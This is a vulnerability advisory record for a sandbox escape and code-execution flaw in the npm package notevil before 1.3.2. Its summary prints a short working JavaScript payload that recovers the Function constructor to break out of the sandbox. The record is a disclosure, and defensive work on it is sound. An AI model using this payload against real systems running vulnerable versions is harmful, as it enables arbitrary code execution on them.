advisory_id: GHSA-7r5f-7qr4-pf6q
datasource_id: github_osv_importer_v2/GHSA-7r5f-7qr4-pf6q
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-7r5f-7qr4-pf6q/GHSA-7r5f-7qr4-pf6q.json
aliases: []
summary: "Sandbox Breakout / Arbitrary Code Execution in notevil\nVersions of `notevil` prior\
  \ to 1.3.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. The package\
  \ fails to prevent access to the `Function` constructor by not checking the return values\
  \ of function calls. This allows attackers to access the Function prototype's constructor\
  \ leading to the Sandbox Escape. An example payload is:  \n```\nvar safeEval = require('notevil')\n\
  var input = \"\" + \n\"function fn() {};\" + \n\"var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__).constructor;\"\
  \ + \n\"var properties = Object.values(constructorProperty);\" + \n\"properties.pop();\" +\
  \ \n\"properties.pop();\" + \n\"properties.pop();\" + \n\"var Function = properties.pop();\"\
  \ + \n\"(Function('return this'))()\"; \nsafeEval(input)```\n\n\n## Recommendation\n\nUpgrade\
  \ to version 1.3.2 or later."
impacted_packages:
  - purl: pkg:npm/notevil
    affected_versions: vers:npm/<1.3.2
    fixed_versions: vers:npm/1.3.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://www.npmjs.com/advisories/1093
    reference_type:
    reference_id:
